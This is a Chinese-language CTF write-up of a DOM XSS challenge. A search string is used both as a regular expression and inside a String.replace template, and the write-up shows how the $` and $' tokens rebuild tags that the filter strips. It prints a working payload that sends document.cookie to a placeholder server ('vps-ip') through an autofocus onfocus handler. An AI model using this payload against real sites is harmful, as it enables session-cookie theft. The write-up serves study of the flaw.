# Post to zuckonit another version

## 题目简述

这一版本仍要求从主页面允许的同源 iframe 进入无 CSP 的 `/preview`，但原先可控的“查找 + 替换”被收紧为只可控一个搜索字符串，并额外过滤双引号和反斜杠。前端会把该字符串同时编译为正则表达式并放入 `String.replace` 的替换模板，由此可以利用正则分支和 JavaScript 的特殊替换标记凭空构造标签。

## 解题过程

先在主页面提交允许通过过滤的内容：

```html
<iframe src="preview">
```

`/preview` 的关键逻辑是：

```javascript
let substr = new RegExp(content, 'g')
div.innerHTML = data[i].replace(
    substr,
    `<b class="search_result">${content}</b>`
)
```

这里有两层可控语义：

1. `content` 中的 `|` 会成为正则“二选一”，左侧只要匹配到 `iframe`，右侧就不需要在原文中出现；
2. 在 `String.replace` 的替换字符串里，特殊序列 `$\`` 表示匹配项左侧的原文，`$'` 表示匹配项右侧的原文。

原始内容是 `<iframe src="preview">`，因此匹配 `iframe` 时，左侧原文正好包含 `<`，右侧原文包含 ` src="preview">`。把二者作为替换标记嵌入可控字符串，就能借用这对尖括号构造新的元素。官方 payload 为：

```text
iframe|$`input size=11 onfocus=window.open('vps-ip'+document.cookie) autofocus$'
```

其中 `iframe|...` 保证正则能够匹配；替换阶段的 `$\`` 生成左尖括号，`$'` 补回右侧属性和右尖括号。最终 DOM 中出现带 `autofocus` 的 `input`，聚焦时触发 `onfocus`，通过 `window.open` 把管理员 Cookie 发送到受控服务器。把 `vps-ip` 换成自己的接收地址，再让管理员机器人访问即可取得 flag。

官方 PDF 没有记录在线实例的具体 flag，但完整保存了源代码语义和最终 payload，因此无需依赖其引用的 RCTF 原题链接也能理解攻击链。

## 方法总结

正则搜索字符串进入 `replace` 时，不能只分析“它能匹配什么”，还要分析替换模板如何解释 `$` 序列。本题把正则分支用于制造不存在于原文的 payload，再用匹配前缀和后缀复用被过滤掉的尖括号。遇到类似 DOM XSS，应逐层区分正则语法、模板字符串插值、替换字符串语法和最终 HTML 解析。
